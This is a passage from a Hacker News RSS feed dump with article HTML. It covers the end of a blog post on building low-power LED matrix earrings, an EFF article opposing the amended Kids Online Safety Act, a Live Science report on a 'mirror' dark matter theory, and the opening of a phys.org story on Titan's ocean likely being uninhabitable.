Rather short-sightedly, I soldered the connections in place and set the circuit without fully testing it. I was exceptionally careful with setting the prongs, which was silly as I soon had to undo this and modify things.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/assembly2.jpg" alt="Circuit set within the prongs"></p><p>

The power draw of my original firmware was far too high, it's dumb I didn't see it coming. The teeny battery can't cope with the current draw, the voltage drops and the CH32V003's brownout detector resets the chip. With some further digging into the datasheet it might be possible to disable the brownout detector. I'm more used to the ATtiny chips, many of which are happy to run down to 1.8V. </p><p>

It is just about possible to reprogram the circuit with it set in place, I use a crocodile clip to connect the positive terminal, touch one wire to the end to make the ground connection, and then touch one more wire inside to make contact with the debug pin. However, doing this more than once is a right pain, so I opened up the earring again to do things properly.</p><p>

While we're at it, adding some capacitors is bound to help.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/assembly3.jpg" alt="Unset circuit and two capacitors added"></p><p>

That's a 22uF and a 0.1uF in parallel. Sometimes large-value, physically small ceramic capacitors have a high internal resistance so it can be helpful to combine multiple values in parallel like this.</p><p>

I dropped the clock speed of the chip from 48MHz to 1.5MHz, and one of the things I found is that this affects the debugger connection. Ordinarily this is fine, there's a utility that lets you "unbrick" the chip by power cycling it and immediately connecting. This unfortunately necessitates debug control of the power supply, which is why it becomes very fiddly in our situation, and is what led to me trying to connect to the earring post with crocodile clips.</p><p>

In the end I got the display into a state I was happy with, a duty cycle of about 0.25% and the reduced clock speed means the overall power draw is something like 8mA. </p><p>

With that, we were able to call it done, and begin work on the second one, which had the added fun of a video camera in the way of everything.</p><h3>Vanity shots</h3>
<p><img src="https://mitxela.com/img/uploads/blinken/ledstud/finished2.jpg" alt="Completed earring"></p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/finished1.jpg" alt="Two earrings completed"></p><p>

You may have clocked a certain amount of self-doubt I expressed as I came to set the circuit. It's an impressive electronics project, but is it an earring anyone would want to wear? To be fair, it's not like that's stopped me in the past from building <a href="https://mitxela.com/projects/knurled_earrings">utterly tasteless earrings</a> that no one would be seen dead with.</p><p>

But my friend seemed quite keen to try on more glowy glowy accessories. I suspect she secretly enjoyed being an ear model.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/finished3.jpg" alt="Earring being worn"></p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/finished4.jpg" alt="Earring being worn"></p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/finished5.jpg" alt="Earring being worn"></p><p>

One idea I'd meant to try with the industrial piercing is combining a long exposure with flash, to try and get a still image with LED trails.</p><p>

<img src="https://mitxela.com/img/uploads/blinken/ledstud/pov.jpg" alt="Long exposure LED trails of the earring being worn"></p><p>

This led to a somewhat inevitable conclusion. Believe it or not, it was her idea.</p><p>

<a href="https://mitxela.com/img/uploads/blinken/ledstud/mitxela_pov_big.jpg"><img src="https://mitxela.com/img/uploads/blinken/ledstud/mitxela_pov_small.jpg" alt="The text 'mitxela' written in trails of LED sparkles"></a></p><p>(click for full size)</p><div><p>

The source code for this project is identical to the badge, and is available on <a href="https://git.mitxela.com/badge">git.mitxela.com</a> and <a href="https://github.com/mitxela/badge">github</a>.</p></div><nav>
<a href="https://mitxela.com/projects/random" title="random project">~</a>
<span typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="https://mitxela.com/">mitxela.com</a></span> » 
<span typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="https://mitxela.com/projects">Projects</a></span> » 
<span typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="https://mitxela.com/projects/hardware">Hardware</a></span> »
<span typeof="v:Breadcrumb"><a rel="v:url" property="v:title" href="https://mitxela.com/projects/ledstud">LED Matrix Earrings</a></span>
<p>Questions? Comments? Check out the <a href="https://mitxela.com/forum">Forum</a>
</p><p><a href="https://mitxela.com/support">Support mitxela.com</a>
</p></nav></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Don't fall for the latest changes to the dangerous Kids Online Safety Act (134 pts)]]></title>
            <link>https://www.eff.org/deeplinks/2024/02/dont-fall-latest-changes-dangerous-kids-online-safety-act</link>
            <guid>39446355</guid>
            <pubDate>Tue, 20 Feb 2024 20:18:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.eff.org/deeplinks/2024/02/dont-fall-latest-changes-dangerous-kids-online-safety-act">https://www.eff.org/deeplinks/2024/02/dont-fall-latest-changes-dangerous-kids-online-safety-act</a>, See on <a href="https://news.ycombinator.com/item?id=39446355">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p><span data-contrast="auto">The authors of the dangerous Kids Online Safety Act (KOSA) unveiled an </span><a href="https://www.blumenthal.senate.gov/download/21424_-kosa---bill-text"><span data-contrast="none">amended version this week</span></a><span data-contrast="auto">, but it’s still an unconstitutional censorship bill that continues to empower state officials to target services and online content they do not like. We are asking everyone reading this to </span><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids"><span data-contrast="none">oppose this latest version</span></a><span data-contrast="auto">, and to <a href="https://www.eff.org/deeplinks/2023/07/young-people-should-oppose-kids-online-safety-act">demand that their representatives oppose it</a>—even if you have already done so.</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids" target="_blank" rel="noopener noreferrer">TAKE ACTION</a></p>
<p><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids" target="_blank" rel="noopener noreferrer">TELL CONGRESS:&nbsp;OPPOSE THE KIDS ONLINE SAFETY ACT</a></p>
<p><span data-contrast="auto">KOSA remains a dangerous bill that would allow the government to decide what types of information can be shared and read online by everyone. It would still require an enormous number of websites, apps, and online platforms to filter and block legal, and important, speech. It would almost certainly still result in age verification requirements. Some of its provisions </span><a href="https://www.eff.org/deeplinks/2023/09/get-real-congress-censoring-search-results-or-recommendations-still-censorship"><span data-contrast="none">have</span></a> <a href="https://www.eff.org/deeplinks/2023/08/congress-amended-kosa-its-still-censorship-bill"><span data-contrast="none">changed</span></a><span data-contrast="auto"> over time, and its latest changes are detailed below. </span><b><span data-contrast="auto">But those improvements do not cure KOSA’s core First Amendment problems.</span></b><span data-contrast="auto"> Moreover, a close review shows that state attorneys general still have a great deal of power to target online services and speech they do not like, which we think will harm children seeking access to basic health information and a variety of other content that officials deem harmful to minors.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">We’ll dive into the details of KOSA’s latest changes, but first we want to remind everyone of the stakes. KOSA is still a censorship bill and it will still harm a large number of minors who have First Amendment rights to access lawful speech online. It will endanger young people and impede the rights of everyone who uses the platforms, services, and websites affected by the bill. Based on our previous analyses, statements by its authors and various interest groups, as well as the overall politicization of youth education and online activity, we believe the following groups—to name just a few—will be endangered:&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<ul>
<li><b><span data-contrast="auto">LGBTQ+ Youth</span></b><span data-contrast="auto"> will be at risk of having content, educational material, and their own online identities erased.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Young people searching for sexual health and reproductive rights information</span></b><span data-contrast="auto"> will find their search results stymied.</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Teens and children in historically oppressed and marginalized groups </span></b><span data-contrast="auto">will be unable to locate information about their history and shared experiences.</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Activist youth on either side of the aisle, such as those fighting for changes to climate laws, gun laws, or religious rights</span></b><span data-contrast="auto">,</span> <span data-contrast="auto">will be siloed, and unable to advocate and connect on platforms.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Young people seeking mental health help and information</span></b><span data-contrast="auto"> will be blocked from finding it, because even discussions of suicide, depression, anxiety, and eating disorders will be hidden from them.</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Teens hoping to combat the problem of addiction—either their own, or that of their friends, families, and neighbors</span></b><span data-contrast="auto">,</span> <span data-contrast="auto">will not have the resources they need to do so.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Any young person seeking truthful news or information that could be considered depressing </span></b><span data-contrast="auto">will find it harder to educate themselves and engage in current events and honest discussion.</span><span data-ccp-props="{}">&nbsp;</span></li>
<li><b><span data-contrast="auto">Adults in any of these groups who are unwilling to share their identities </span></b><span data-contrast="auto">will find themselves shunted onto a second-class internet alongside the young people who have been denied access to this information.</span><span data-ccp-props="{}">&nbsp;</span></li>
</ul>
<h3><b><span data-contrast="auto">What’s Changed in the Latest (2024) Version of KOSA</span></b><span data-ccp-props="{}">&nbsp;</span></h3>
<p><b><span data-contrast="auto">In its impact, the latest version of KOSA is not meaningfully different from those previous versions.</span></b><span data-contrast="auto"> The “duty of care” censorship section remains in the bill, though modified as we will explain below. The latest version removes the authority of state attorneys general to sue or prosecute people for not complying with the “duty of care.” But KOSA still permits these state officials to enforce other part of the bill based on their political whims and we expect those officials to use this new law to the same censorious ends as they would have of previous versions. And the legal requirements of KOSA are still only possible for sites to safely follow if they restrict access to content based on age, effectively mandating age verification. &nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-ccp-props="{}">KOSA is still a censorship bill and it will still harm a large number of minors</span></p>
<h4><b><span data-contrast="auto">Duty of Care is Still a Duty of Censorship</span></b><span data-ccp-props="{}">&nbsp;</span></h4>
<p><span data-contrast="auto">Previously, KOSA outlined a wide collection of harms to minors that platforms had a duty to prevent and mitigate through “the design and operation” of their product. This includes self-harm, suicide, eating disorders, substance abuse, and bullying, among others. This seemingly anodyne requirement—that apps and websites must take measures to prevent some truly awful things from happening—would have led to overbroad censorship on otherwise legal, important topics for everyone&nbsp;</span><a href="http://xn--as%20weve%20explained%20before-0y8r/"><span>as we’ve explained before</span></a><span data-contrast="auto">. </span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">The updated duty of care says that a platform shall “exercise reasonable care in the creation and implementation of any design feature” to prevent and mitigate those harms. The difference is subtle, and ultimately, unimportant. There is no case law defining what is “reasonable care” in this context. This language still means increased liability merely for hosting and distributing otherwise legal content that the government—in this case the FTC—claims is harmful.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<h4><b><span data-contrast="auto">Design Feature Liability</span></b><span data-ccp-props="{}">&nbsp;</span></h4>
<p><span data-contrast="auto">The bigger textual change is that the bill now includes a definition of a “design feature,” which the bill requires platforms to limit for minors. The “design feature” of products that could lead to liability is defined as:</span><span data-ccp-props="{}">&nbsp;</span></p>
<blockquote><p><i><span data-contrast="auto">any feature or component of a covered platform that will encourage or increase the frequency, time spent, or activity of minors on the covered platform, or activity of minors on the covered platform.</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">Design features include but are not limited to</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(A) infinite scrolling or auto play;</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(B) rewards for time spent on the platform;</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(C) notifications;</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(D) personalized recommendation systems;</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(E) in-game purchases; or</span></i><span data-ccp-props="{}">&nbsp;</span></p>
<p><i><span data-contrast="auto">(F) appearance altering filters.</span></i><span data-ccp-props="{}">&nbsp;</span></p>
</blockquote>
<p><span data-contrast="auto">These design features are a mix of basic elements and those that may be used to keep visitors on a site or platform. There are several problems with this provision. First, it’s not clear when offering basic features that many users rely on, such as notifications, by itself creates a harm. But that points to the fundamental problem of this provision. KOSA is essentially trying to use features of a service as a proxy to create liability for speech online that the bill’s authors do not like. But the list of harmful designs shows that the legislators backing KOSA want to regulate online </span><i><span data-contrast="auto">content</span></i><span data-contrast="auto">, not just design.&nbsp;&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">For example, if an online service presented an endless scroll of math problems for children to complete, or rewarded children with virtual stickers and other prizes for reading digital children’s books, would lawmakers consider those design features harmful? Of course not. Infinite scroll and autoplay are generally not a concern for legislators. It’s that these lawmakers do not like some lawful content that is accessible via online service’s features.</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">What KOSA tries to do here then is to launder restrictions on content that lawmakers do not like through liability for supposedly harmful “design features.” But the First Amendment still prohibits Congress from indirectly trying to censor lawful speech it disfavors.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-ccp-props="{}">We&nbsp;shouldn’t&nbsp;kid ourselves that the latest version of KOSA will stop state officials from targeting vulnerable communities.</span></p>
<p><span data-contrast="auto">Allowing the government to ban content designs is a dangerous idea. If the FTC decided that direct messages, or encrypted messages, were leading to harm for minors—under this language they could bring an enforcement action against a platform that allowed users to send such messages.</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">Regardless of whether we like infinite scroll or auto-play on platforms, these design features are protected by the First Amendment; just like the design features we </span><i><span data-contrast="auto">do </span></i><span data-contrast="auto">like. If the government tried to limit an online newspaper from using an infinite scroll feature or auto-playing videos, that case would be struck down. KOSA’s latest variant is no different.&nbsp;&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<h4><b><span data-contrast="auto">Attorneys General Can Still Use KOSA to Enact Political Agendas</span></b><span data-ccp-props="{}">&nbsp;</span></h4>
<p><span data-contrast="auto">As we mentioned above, the enforcement available to attorneys general has been narrowed to no longer include the duty of care. But due to the rule of construction and the fact that attorneys general can still enforce other portions of KOSA, this is cold comfort.</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">For example, it is true enough that the amendments to KOSA prohibit a state from targeting an online service based on claims that in hosting LGBTQ content that it violated KOSA’s duty of care. Yet that same official could use another provision of KOSA—which allows them to file suits based on failures in a platform’s design—to target the same content. The state attorney general could simply claim that they are not targeting the LGBTQ content, but rather the fact that the content was made available to minors via notifications, recommendations, or other features of a service.</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">We shouldn’t kid ourselves that the latest version of KOSA will stop state officials from targeting vulnerable communities. And KOSA leaves </span><i><span data-contrast="auto">all</span></i><span data-contrast="auto"> of the bill’s censorial powers with the FTC, a five-person commission nominated by the president. This</span> <span data-contrast="auto">still allows a small group of federal officials appointed by the President to decide what content is dangerous for young people. Placing this enforcement power with the FTC is still a First Amendment problem: no government official, state or federal, has the power to dictate by law what people can read online.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<h3><b><span data-contrast="auto">The Long Fight Against KOSA Continues in 2024</span></b><span data-ccp-props="{}">&nbsp;</span></h3>
<p><span data-contrast="auto">For </span><a href="https://www.eff.org/deeplinks/2022/03/kids-online-safety-act-heavy-handed-plan-force-platforms-spy-young-people"><span>two years now</span></a><span data-contrast="auto">, EFF has laid out the clear arguments against this bill. KOSA creates liability if an online service fails to perfectly police a variety of content that the bill deems harmful to minors. Services have little room to make any mistakes if some content is later deemed harmful to minors and, as a result, are likely to restrict access to a broad spectrum of lawful speech, including information about health issues like eating disorders, drug addiction, and anxiety.&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span data-contrast="auto">The fight against KOSA has amassed an enormous coalition of people <a href="https://www.eff.org/deeplinks/2023/07/young-people-should-oppose-kids-online-safety-act">of all ages</a> and all walks of life who know that censorship is not the right approach to protecting people online, and that the promise of the internet is one that must apply equally to everyone, regardless of age. Some of the people who have advocated against KOSA from day one have now graduated high school or college. But every time this bill returns, more people learn why we must stop it from becoming law.&nbsp;&nbsp;</span><span data-ccp-props="{}">&nbsp;</span></p>
<p><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids" target="_blank" rel="noopener noreferrer">TAKE ACTION</a></p>
<p><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids" target="_blank" rel="noopener noreferrer">TELL CONGRESS:&nbsp;OPPOSE THE KIDS ONLINE SAFETY ACT</a></p>
<p><span data-contrast="auto">We cannot afford to allow the government to decide what information is available online. Please <a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids">contact your representatives today to tell them to stop the Kids Online Safety Act from moving forward.</a></span><a href="https://act.eff.org/action/tell-congress-kosa-will-censor-the-internet-but-won-t-help-kids"><span data-ccp-props="{}">&nbsp;</span></a></p>

</div>

          </article>
    </div><div>
          <h2>Join EFF Lists</h2>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Study suggests a 'dark mirror' universe within ours where atoms failed to form (115 pts)]]></title>
            <link>https://www.livescience.com/space/cosmology/there-may-be-a-dark-mirror-universe-within-ours-where-atoms-failed-to-form-new-study-suggests</link>
            <guid>39445997</guid>
            <pubDate>Tue, 20 Feb 2024 19:48:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.livescience.com/space/cosmology/there-may-be-a-dark-mirror-universe-within-ours-where-atoms-failed-to-form-new-study-suggests">https://www.livescience.com/space/cosmology/there-may-be-a-dark-mirror-universe-within-ours-where-atoms-failed-to-form-new-study-suggests</a>, See on <a href="https://news.ycombinator.com/item?id=39445997">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="content">
<section>
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture><source type="image/webp" alt="A galaxy cluster colorized to show invisible dark matter (blue) alongside regular, visible matter (red, green, and orange)." onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg"><source type="image/jpeg" alt="A galaxy cluster colorized to show invisible dark matter (blue) alongside regular, visible matter (red, green, and orange)." onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg"><img src="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-320-80.jpg" alt="A galaxy cluster colorized to show invisible dark matter (blue) alongside regular, visible matter (red, green, and orange)." onerror="if(this.src &amp;&amp; this.src.indexOf('missing-image.svg') !== -1){return true;};this.parentNode.replaceChild(window.missingImage(),this)" srcset="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg"></picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/qN7No4utcM8F9gSFHtPGDC.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Radio: GBT Green Bank Observatory/National Science Foundation (NSF); Optical: Subaru Tele-scope, National Astronomical Observatory of Japan/HSC-SSP collaboration; X-ray: European Space Agency (ESA)/XMM-Newton/XXL survey consortium.)</span>
</figcaption>
</div>

<div itemprop="articleBody" id="article-body">

<p>What if the world of dark matter was a mirror of our own, just with a broken set of rules? That might explain why dark matter appears to be so abundant yet invisible, a new theory suggests.</p><p><a data-analytics-id="inline-link" href="https://www.livescience.com/dark-matter.html" data-before-rewrite-localise="https://www.livescience.com/dark-matter.html"><u>Dark matter</u></a> is the mysterious, unknown substance that seems to make up the bulk of all the mass in the universe; for every 2 pounds (1 kilogram) of regular matter, there's roughly 10 pounds (5 kg) of dark matter. It doesn't interact with light or normal matter. The only way scientists can detect it is through its subtle gravitational influence on normal matter, such as the motions of stars within galaxies and the <a data-analytics-id="inline-link" href="https://www.livescience.com/space/cosmology/james-webb-telescope-detects-the-earliest-strand-in-the-cosmic-web-ever-seen" data-before-rewrite-localise="https://www.livescience.com/space/cosmology/james-webb-telescope-detects-the-earliest-strand-in-the-cosmic-web-ever-seen"><u>growth of super-large structures</u></a> in cosmic time.</p><p>It might be easy to think that because matter and dark matter operate with different rules, one would be totally dominant over the other. But despite having wildly different properties, the amounts of normal matter and dark matter are still in the same ballpark. That seems like a strange coincidence. &nbsp;To explain this, scientists proposed there could be some sort of hidden link between them. They published their research <a data-analytics-id="inline-link" href="https://arxiv.org/abs/2401.12286" target="_blank" data-url="https://arxiv.org/abs/2401.12286"><u>Jan. 22 on the preprint journal arXiv</u></a>.</p><p>The researchers posited that for every physical interaction in normal matter, there's a mirror of it in the world of dark matter. This would be a new kind of symmetry in nature, connecting the normal and dark matter worlds, the researchers said.</p><p>This symmetry would help explain why dark matter and regular matter have roughly the same abundances.</p><p><strong>Related: </strong><a data-analytics-id="inline-link" href="https://www.livescience.com/space/cosmology/our-universe-is-merging-with-baby-universes-causing-it-to-expand-new-theoretical-study-suggests" data-before-rewrite-localise="https://www.livescience.com/space/cosmology/our-universe-is-merging-with-baby-universes-causing-it-to-expand-new-theoretical-study-suggests"><u><strong>Our universe is merging with 'baby universes', causing it to expand, new theoretical study suggests</strong></u></a></p><p>In the paper, the researchers point out another strange coincidence. In the physics of normal matter, a neutron and proton have almost exactly the same mass, which enables them to bind together and form stable atoms. If a proton was just a little bit heavier, it would be totally unstable and decay in only a few minutes, making the formation of atoms impossible. In this imaginary scenario, the universe would be left with a sea of free-floating neutrons.</p><p>Perhaps, the researchers suggest, this imaginary, broken cosmos may be a reality in the dark matter mirror version of our universe. A special combination of physics led to a proton having roughly the same mass as a neutron; perhaps in the dark matter mirror, that combination of physics played out differently, causing the "dark proton" to evaporate and leave behind a sea of "dark neutrons" — what we identify as dark matter.</p><p>While this proposed mirror model allows for the possibility of rich interactions among dark matter particles — dark atoms, dark chemistry and a <a data-analytics-id="inline-link" href="https://www.livescience.com/space/cosmology/dark-matter-may-have-its-own-invisible-periodic-table-of-elements" data-before-rewrite-localise="https://www.livescience.com/space/cosmology/dark-matter-may-have-its-own-invisible-periodic-table-of-elements"><u>dark periodic table of dark elements</u></a> — there can't be too much interaction, the researchers noted. If the dark matter interacts with itself a lot, it would tend to clump up far more than scientists think it does. So most of the dark matter has to be relatively simple — a sea of free-floating, neutral particles.</p><p>These additional interactions, which would be a dark mirror of our chemical world, may enable future scientists to test this theory. In the early universe, normal matter underwent nucleosynthesis, when the first elements formed in a nuclear plasma. If this new idea is correct, then there was a mirror nucleosynthesis also happening in dark matter. In those chaotic early days, channels may have opened up between the two worlds, enabling them to affect each other.</p><p>By carefully measuring the rate of element formation — something that the next generation of cosmological observatories hope to do — scientists may be able to find evidence for one of these channels and get a glimpse into the mirror dark universe.</p>
</div>
<div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-K6uQXghwYeGHtQcXRYoNKX"><section><p>Get the world’s most fascinating discoveries delivered straight to your inbox.</p></section></div>
<div id="slice-container-authorBio-K6uQXghwYeGHtQcXRYoNKX"><p>Paul M. Sutter is a research professor in astrophysics at &nbsp;SUNY Stony Brook University and the Flatiron Institute in New York City. He regularly appears on TV and podcasts, including &nbsp;"Ask a Spaceman." He is the author of two books, "Your Place in the Universe" and "How to Die in Space," and is a regular contributor to Space.com, Live Science, and more. Paul received his PhD in Physics from the University of Illinois at Urbana-Champaign in 2011, and spent three years at the Paris Institute of Astrophysics, followed by a research fellowship in Trieste, Italy.&nbsp;</p></div>


</section>




<div id="slice-container-relatedArticles"><p><h5>Most Popular</h5></p></div>








</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Saturn's largest moon most likely uninhabitable (121 pts)]]></title>
            <link>https://phys.org/news/2024-02-saturn-largest-moon-uninhabitable.html</link>
            <guid>39445713</guid>
            <pubDate>Tue, 20 Feb 2024 19:27:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2024-02-saturn-largest-moon-uninhabitable.html">https://phys.org/news/2024-02-saturn-largest-moon-uninhabitable.html</a>, See on <a href="https://news.ycombinator.com/item?id=39445713">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2024/saturns-largest-moon-m-1.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2024/saturns-largest-moon-m-1.jpg" data-sub-html="This image shows a flattened (Mercator) projection of the Huygens probe's view of Saturn's moon Titan from 10 kilometers altitude. The images that make up this view were taken on Jan. 14, 2005, with the descent imager/spectral radiometer onboard the European Space Agency's Huygens probe. The Huygens probe was delivered to Titan by the Cassini spacecraft, managed by NASA's Jet Propulsion Laboratory, Pasadena, Calif. Credit: ESA/NASA/JPL/University of Arizona photo">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2024/saturns-largest-moon-m-1.jpg" alt="Saturn's largest moon most likely uninhabitable" title="This image shows a flattened (Mercator) projection of the Huygens probe's view of Saturn's moon Titan from 10 kilometers altitude. The images that make up this view were taken on Jan. 14, 2005, with the descent imager/spectral radiometer onboard the European Space Agency's Huygens probe. The Huygens probe was delivered to Titan by the Cassini spacecraft, managed by NASA's Jet Propulsion Laboratory, Pasadena, Calif. Credit: ESA/NASA/JPL/University of Arizona photo" width="800" height="420">
             <figcaption>
                This image shows a flattened (Mercator) projection of the Huygens probe's view of Saturn's moon Titan from 10 kilometers altitude. The images that make up this view were taken on Jan. 14, 2005, with the descent imager/spectral radiometer onboard the European Space Agency's Huygens probe. The Huygens probe was delivered to Titan by the Cassini spacecraft, managed by NASA's Jet Propulsion Laboratory, Pasadena, Calif. Credit: ESA/NASA/JPL/University of Arizona photo
            </figcaption>        </figure>
    </div><p>A study led by Western astrobiologist Catherine Neish shows the subsurface ocean of Titan—the largest moon of Saturn—is most likely a non-habitable environment, meaning any hope of finding life in the icy world is dead in the water.</p>


										      
																																	<p>This discovery means it is far less likely that space scientists and astronauts will ever find life in the <a href="https://phys.org/tags/outer+solar+system/" rel="tag">outer solar system</a>, home to the four 'giant' planets: Jupiter, Saturn, Uranus and Neptune.</p>
<p>"Unfortunately, we will now need to be a little less optimistic when searching for extraterrestrial lifeforms within our own solar system," said Neish, an Earth sciences professor. "The <a href="https://phys.org/tags/scientific+community/" rel="tag">scientific community</a> has been very excited about finding life in the icy worlds of the outer solar system, and this finding suggests that it may be less likely than we previously assumed."</p>
<p>The identification of life in the outer solar system is a significant area of interest for planetary scientists, astronomers and government space agencies like NASA, largely because many icy moons of the giant planets are thought to have large subsurface oceans of liquid <a href="https://phys.org/tags/water/" rel="tag">water</a>. Titan, for example, is thought to have an <a href="https://phys.org/tags/ocean/" rel="tag">ocean</a> beneath its icy <a href="https://phys.org/tags/surface/" rel="tag">surface</a> that is more than 12 times the volume of Earth's oceans.</p>
